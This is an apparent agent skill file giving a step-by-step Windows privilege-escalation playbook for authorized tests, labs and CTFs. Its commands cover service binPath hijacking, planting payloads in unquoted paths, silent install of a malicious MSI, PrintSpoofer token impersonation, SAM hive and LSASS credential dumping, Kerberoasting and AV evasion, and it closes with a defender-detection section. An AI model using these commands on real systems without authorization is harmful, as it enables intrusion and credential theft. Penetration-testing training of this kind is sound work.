---
name: privesc-windows
description: Use when you hold a low-privilege Windows shell on an authorized engagement, lab, or CTF and need a path to SYSTEM or Administrator. Covers WinPEAS and PowerUp.ps1 enumeration, service misconfigurations (weak permissions, unquoted paths), AlwaysInstallElevated MSI abuse, registry secrets (AutoLogon, Group Policy Preferences cpassword, unattend files), scheduled task hijacking, token impersonation with SeImpersonatePrivilege (PrintSpoofer and potato techniques), credential hunting in files and memory, kernel and driver exploits, and AD-linked paths such as Kerberoasting and DCSync prerequisites. Emphasizes verifying permissions before exploitation and capturing evidence for reports.
version: 1.0.0
domain: privesc
lifecycle: stable
last_verified: 2026-10-23
requires: []
extends: []
relates: [privesc-linux]
tools:
  - name: winpeas
    version: 2.x
  - name: powershell
    version: 7.4.x
  - name: mimikatz
    version: 2.2.0-20220919
  - name: nmap
    version: 7.98
---

Windows privilege escalation turns a low-privilege foothold into SYSTEM or Administrator on systems you are authorized to test. Windows misconfigurations cluster around services, scheduled tasks, the registry, and tokens, so this skill orders your work that way: enumerate automatically with WinPEAS and PowerUp, verify each candidate permission by hand, exploit the quietest reliable path, and capture evidence. Potato-style token attacks only work when the account holds SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege, so check privileges before reaching for them.

## Quick Workflow

1. Establish context: user, privileges, OS build, domain membership, network position.
2. Run WinPEAS and PowerUp.ps1; save output for local analysis.
3. Review services: weak service permissions, weak binary permissions, unquoted paths.
4. Review persistence-adjacent misconfigurations: scheduled tasks, registry (AlwaysInstallElevated, AutoLogon), startup folders.
5. Hunt credentials: unattend files, Group Policy Preferences, config files, memory.
6. Check token privileges for impersonation attacks (SeImpersonatePrivilege).
7. Exploit the lowest-noise verified path, confirm elevation, capture proof.
8. If the host is domain-joined, evaluate AD-linked paths (Kerberoasting needs only a domain user; DCSync needs replication rights).

## Phase 1: Orientation and automated enumeration

Baseline the host from your shell:

```powershell
whoami /priv
whoami /groups
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
hostname; ipconfig | findstr IPv4
```

`whoami /priv` is the most important: it lists token privileges including SeImpersonatePrivilege, SeBackupPrivilege, and SeDebugPrivilege, which decide whole attack classes.

Run WinPEAS (transfer to target, run, exfiltrate the output):

```powershell
.\winPEASx64.exe > C:\Temp\peas.txt
```

Run PowerUp and review every check it flags:

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

PowerUp flags categories like ModifiableServiceBinaries, UnquotedServicePaths, ModifiableServices, and AlwaysInstallElevated. Treat each as a lead to verify manually, not as a confirmed vulnerability.

## Phase 2: Service misconfigurations

Enumerate services and their binaries:

```powershell
wmic service get name,displayname,pathname,startmode | findstr /v "C:\Windows"
sc.exe qc ServiceName
Get-Service | Where-Object {$_.Status -eq 'Running'}
```

Check who can modify the service configuration versus who can modify the binary. Both are wins:

- Modifiable service (SERVICE_CHANGE_CONFIG): point the service at your payload with `sc.exe config`, then restart it.
- Writable service binary: replace the binary, then restart the service.

```powershell
sc.exe config ServiceName binPath= "C:\Temp\payload.exe"
sc.exe stop ServiceName
sc.exe start ServiceName
```

Note the space after `binPath=`; `sc.exe` syntax requires it. Your payload should be a simple reverse shell or a user-addition executable compiled for the target architecture.

Verify permissions with accesschk from Sysinternals when it is available:

```powershell
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -ucqv ServiceName
```

## Phase 3: Unquoted service paths

A service whose binary path contains spaces and is not quoted lets Windows resolve the path greedily. For `C:\Program Files\Vendor\App\service.exe` running as SYSTEM, Windows tries `C:\Program.exe`, then `C:\Program Files\Vendor\App.exe`, and so on. If you can write to any of those parent directories, drop your payload there with the matching name and restart the service.

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

This filters for auto-start services outside `C:\Windows` whose paths lack quotes. For each hit, test directory writability:

```powershell
icacls "C:\Program Files\Vendor"
```

Then place `App.exe` (matching the first space-split segment) compiled as your payload, restart the service, and catch the SYSTEM shell. Confirm the service actually runs as SYSTEM or Administrator first; a NETWORK SERVICE binary is a weaker win.

## Phase 4: Registry misconfigurations

AlwaysInstallElevated: if both the machine and user policy keys are set to 1, any user can install an MSI as SYSTEM.

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both return `0x1`, generate an MSI on your attack box and install it quietly:

```powershell
msiexec /quiet /qn /i C:\Temp\evil.msi
```

AutoLogon credentials in the registry:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "password DefaultUserName"
```

Also check PowerShell history and the Run keys for persistence-adjacent entries:

```powershell
type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

## Phase 5: Scheduled tasks

List tasks and look for ones running as SYSTEM or Administrator that execute a file you can modify:

```powershell
schtasks /query /fo LIST /v | findstr /i "taskname run.as"
```

For each interesting task, check the binary and its directory with `icacls`. If the binary is writable, replace it and wait for (or trigger) the schedule. If only the directory is writable, check for DLL side-loading or config abuse. Trigger a task on demand when you have rights:

```powershell
schtasks /run /tn "TaskName"
```

Tasks that run logon scripts or reference user-writable shares are equivalent wins.

## Phase 6: Credential hunting

Windows scatters credentials in predictable places. Search the filesystem for them:

```powershell
findstr /si "password" C:\*.xml C:\*.ini C:\*.txt 2>nul
dir /s /b C:\unattend.xml C:\Windows\Panther\unattend.xml 2>nul
```

Unattend and sysprep files often contain plaintext Administrator passwords in `AutoLogon` or `UserAccounts` sections.

Group Policy Preferences: old `Groups.xml` files may contain `cpassword` values, which use a publicly known AES key. Decrypt with gpp-decrypt on your attack box:

```bash
gpp-decrypt 'cpassword-value-here'
```

Check common application configs too: web.config, app.config, unattended installers, saved RDP and VNC credentials, and cloud tooling configs under `C:\ProgramData`.

If you reach SeDebugPrivilege or Administrator, memory credential access (LSASS) becomes an option on authorized tests, with Mimikatz or comsvcs-based dumps, but treat AV and EDR as part of the terrain and stay inside the agreed scope.

## Phase 7: Token impersonation

Check for the privileges that enable potato-family attacks:

```powershell
whoami /priv | findstr /i "SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```

Service accounts (IIS app pools, SQL Server service, scheduled task contexts) commonly hold SeImpersonatePrivilege. PrintSpoofer and its successors abuse the Print Spooler RPC to coerce SYSTEM authentication, then impersonate the token. The workflow is: upload the tool, run it with a payload command, catch the SYSTEM shell.

```powershell
.\PrintSpoofer64.exe -i -c "C:\Temp\payload.exe"
```

JuicyPotato variants target other DCOM endpoints on older builds. Match the tool to the OS build from `systeminfo`: newer Windows 10/11 and Server 2019/2022 builds need the PrintSpoofer or SweetPotato lineage, not the original JuicyPotato. If neither privilege is present, token impersonation is off the table; move on instead of forcing it.

Also useful: SeBackupPrivilege lets you read any file (back up SAM and SYSTEM hives, then extract hashes offline), and SeDebugPrivilege lets you attach to SYSTEM processes.

```powershell
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
```

Then extract hashes with secretsdump on your attack box.

## Phase 8: Kernel, driver, and AD-linked paths

Kernel and driver exploits are the last resort on Windows too. Warning: they can blue-screen the host. Match the exact build number from `systeminfo` against public exploits, prefer known-good local privilege paths first, and only run driver exploits (BYOVD style) with explicit written approval on authorized targets.

AD-linked paths when the host is domain-joined:

- Any domain user can Kerberoast: request service tickets for SPN accounts and crack them offline with hashcat mode 13100. This is credential access that often yields a privesc credential.
- Password spraying and AS-REP roasting need only a user list, which you can build from the host itself.
- DCSync needs replication rights (Domain Admins, Enterprise Admins, or delegated); it is a domain escalation step, not a local one, so confirm rights before attempting.

```powershell
nltest /dsgetdc:domain.local
net group "Domain Admins" /domain 2>nul
```

## Edge cases

- WinPEAS output is enormous: redirect to a file, exfiltrate it, and review locally. Never scroll thousands of lines in a live shell.
- PowerUp flags a service you cannot actually modify: always confirm with `icacls` or accesschk. Flags are leads, not proof.
- `sc.exe config` fails with access denied: you can see the service but lack SERVICE_CHANGE_CONFIG. Check the binary permissions instead; either side can win.
- Your payload never runs from a scheduled task or service: the binary likely needs to be a proper service executable or the working directory differs. Add logging to a temp file and test with a harmless command first (for example writing `whoami` output to a file).
- AlwaysInstallElevated shows only one of the two keys set: the attack fails. Both HKLM and HKCU must be 1.
- PrintSpoofer fails on a hardened build: the spooler may be disabled or patched. Check `Get-Service Spooler` and pivot to SeBackupPrivilege or service paths.
- AV deletes your payload on write: use in-memory or LOLBin-friendly approaches where the rules of engagement allow, or stage from a less-scrutinized directory and rename at execution time.

## Escalation

- Service and task paths are dry: re-hunt credentials. Unattend files, web configs, and saved RDP/VNC credentials regularly hand out Administrator passwords.
- No SeImpersonatePrivilege: look at SeBackupPrivilege (read SAM/SYSTEM), SeRestorePrivilege (write anywhere, including service binaries), and SeLoadDriverPrivilege (load a signed vulnerable driver only with approval).
- Local paths exhausted on a domain host: pivot to AD. Kerberoast service accounts, spray the user list you enumerated, and check for unconstrained delegation or misconfigured AD CS templates if the engagement scope includes them.
- Still stuck: enumerate localhost-only services and port-forward them. Admin panels, database consoles, and debug endpoints bound to 127.0.0.1 are frequent second footholds.
- Password reuse: any credential found anywhere gets tested against local Administrator, RDP, WinRM, and SMB. One reused password beats every exploit.

## Detection and defender view

- Service binary and configuration changes are logged in the Security event log (event IDs 7045 for new services, 4697, and service start failures in System log). Unexpected service installs stand out.
- Sysmon with a good config captures process creation with parent chains, making PrintSpoofer-style token theft and msiexec abuse visible.
- Scheduled task creation logs event ID 4698. Monitor for tasks created by non-admin users.
- LSASS access is the classic EDR tripwire. Credential Guard and PPL-protected LSASS raise the bar substantially.
- LSA Protection, disabling LLMNR/NBT-NS, removing AlwaysInstallElevated, quoting all service paths, and least-privilege service accounts close most of these paths. Apply the same least-privilege thinking from linux-hardening on the Linux side.
- Unquoted paths and weak service ACLs are found by the same WinPEAS and PowerUp scans attackers run; defenders should run them first.

## Key references

- MITRE ATT&CK: T1068 (Exploitation for Privilege Escalation), T1543.003 (Windows Service), T1053.005 (Scheduled Task), T1134.001 (Token Impersonation/Theft), T1574.010 (Services File Permissions Weakness), T1574.011 (Services Registry Permissions Weakness), T1547.001 (Registry Run Keys), T1552.001 (Credentials In Files), T1552.002 (Credentials in Registry), T1552.006 (Group Policy Preferences), T1003.001 (LSASS Memory), T1558.003 (Kerberoasting), T1003.006 (DCSync).
- CWE: CWE-428 (Unquoted Search Path or Element), CWE-269 (Improper Privilege Management), CWE-250 (Execution with Unnecessary Privileges), CWE-732 (Incorrect Permission Assignment for Critical Resource), CWE-798 (Use of Hard-coded Credentials), CWE-522 (Insufficiently Protected Credentials), CWE-276 (Incorrect Default Permissions).
- Tool docs: PEASS-ng WinPEAS (github.com/peass-ng/PEASS-ng), PowerSploit PowerUp (github.com/PowerShellMafia/PowerSploit), Mimikatz by gentilkiwi (official GitHub repository).
